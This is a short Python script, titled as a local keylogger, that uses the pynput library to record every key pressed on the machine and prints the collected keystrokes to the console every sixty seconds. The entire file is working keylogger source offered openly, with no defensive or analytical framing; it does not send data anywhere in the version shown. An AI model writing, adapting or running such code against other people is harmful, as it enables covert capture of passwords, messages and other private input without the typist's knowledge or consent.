############LOCAL KEYLOGGER WITH PYTHON(KEYLOGGER.PY)############
#!usr/bin/env python

import pynput.keyboard
import threading

log= " "

def process_key(key):
    global log
    try:
        log = log +" "+ str(key.char)+" "
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
#store the keystriikes and print them every 60 @ once
def report():
    global log
    print(log)
    log=""
    timer = threading.Timer(60,report)
    timer.start()

key_listener =pynput.keyboard.Listener(on_press=process_key)

with key_listener:
    report()

    key_listener.join()
